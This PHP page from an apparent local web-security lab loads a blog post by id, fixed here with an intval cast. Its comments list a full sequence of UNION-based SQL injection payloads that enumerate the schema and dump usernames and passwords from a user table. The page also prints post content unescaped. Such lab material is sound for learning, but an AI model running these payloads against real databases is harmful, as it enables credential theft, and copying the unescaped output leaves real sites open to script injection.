<?php

include 'koneksi.php';

// $id = htmlspecialchars($_GET['id']);
// fillter dengan angka
$id = intval($_GET['id']);
$q  = mysqli_query($conn, "SELECT * FROM post WHERE id = {$id}") or die(mysqli_error($conn));

// SQL Injection UNION
// SELECT * FROM post WHERE id = 1 UNION SELECT 1,2,3,4
// http://localhost/web_security/blog/post.php?id=9999%20UNION%20SELECT%201,2,3,4
// SELECT * FROM post WHERE id = 999 AND 1=2 UNION SELECT 1,2,3,4
// http://localhost/web_security/blog/post.php?id=9999%20UNION%20SELECT%201,2,3,4
// SELECT * FROM post WHERE id = 999 UNION SELECT 1,database(),3,user()
// SELECT * FROM post WHERE id = 999 UNION SELECT 1,username,password,4 FROM user
// user pertama
// SELECT * FROM post WHERE id = 999 UNION SELECT 1,username,password,4 FROM user LIMIT 0,1
// SELECT * FROM post WHERE id = 999 UNION SELECT 1,username,password,4 FROM user LIMIT 1,1
// sekaligus
// SELECT * FROM post WHERE id = 999 UNION SELECT 1, group_concat(username), 3,group_concat(password) FROM user
// SELECT TABLE_NAME FROM `TABLES` WHERE TABLE_SCHEMA = 'blog';
// 999 UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema = 'blog'; 
// SELECT COLUMN_NAME FROM `COLUMNS` WHERE TABLE_SCHEMA = 'blog' AND TABLE_NAME = 'user';
// 999 UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_schema = 'blog' AND table_name = 'user'; 


$post = mysqli_fetch_array($q);

?>
<!DOCTYPE html>
<html lang="en">

<head>
	<title>Blog</title>
	<meta http-equiv="content-type" content="text/html;charset=utf-8" />
</head>

<body>

	<h1 style="text-align: center">My Blog</h1>
	<hr>

	<h2><?php echo $post['judul'] ?></h2>
	<small>Tanggal <?php echo $post['tanggal'] ?></small>

	<?php echo $post['konten'] ?>

</body>

</html>